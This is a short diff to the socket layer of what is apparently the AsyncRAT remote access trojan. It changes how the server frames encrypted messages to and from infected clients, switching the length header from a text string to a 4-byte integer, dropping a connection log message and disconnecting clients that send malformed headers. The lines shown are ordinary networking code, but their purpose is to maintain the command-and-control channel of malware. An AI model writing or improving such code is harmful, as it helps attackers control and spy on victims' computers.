@@ -32,12 +32,9 @@ namespace AsyncRAT_Sharp.Sockets
                 Disconnected();
                 return;
             }
-            else
-                HandleLogs.Addmsg($"Client {socket.RemoteEndPoint.ToString().Split(':')[0]} connected successfully", Color.Green);
-
 
             ClientSocket = socket;
-            ClientBuffer = new byte[1];
+            ClientBuffer = new byte[4];
             ClientBuffersize = 0;
             ClientBufferRecevied = false;
             ClientMS = new MemoryStream();
@@ -63,9 +60,11 @@ namespace AsyncRAT_Sharp.Sockets
                     if (Recevied > 0)
                     {
                         if (ClientBufferRecevied == false)
-                            if (ClientBuffer[0] == 0)
+                        {
+                            await ClientMS.WriteAsync(ClientBuffer, 0, ClientBuffer.Length);
+                            if (ClientMS.Length == 4)
                             {
-                                ClientBuffersize = Convert.ToInt64(Encoding.UTF8.GetString(ClientMS.ToArray()));
+                                ClientBuffersize = BitConverter.ToInt32(ClientMS.ToArray(), 0);
                                 ClientMS.Dispose();
                                 ClientMS = new MemoryStream();
                                 if (ClientBuffersize > 0)
@@ -76,7 +75,11 @@ namespace AsyncRAT_Sharp.Sockets
                                 }
                             }
                             else
-                                await ClientMS.WriteAsync(ClientBuffer, 0, ClientBuffer.Length);
+                            {
+                                Disconnected();
+                                return;
+                            }
+                        }
                         else
                         {
                             await ClientMS.WriteAsync(ClientBuffer, 0, Recevied);
@@ -95,7 +98,7 @@ namespace AsyncRAT_Sharp.Sockets
                                     Disconnected();
                                     return;
                                 }
-                                ClientBuffer = new byte[1];
+                                ClientBuffer = new byte[4];
                                 ClientBuffersize = 0;
                                 ClientMS.Dispose();
                                 ClientMS = new MemoryStream();
@@ -164,7 +167,7 @@ namespace AsyncRAT_Sharp.Sockets
                 try
                 {
                     byte[] buffer = Settings.aes256.Encrypt((byte[])Msgs);
-                    byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + (char)0);
+                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);
 
                     ClientSocket.Poll(-1, SelectMode.SelectWrite);
                     ClientSocket.BeginSend(buffersize, 0, buffersize.Length, SocketFlags.None, EndSend, null);
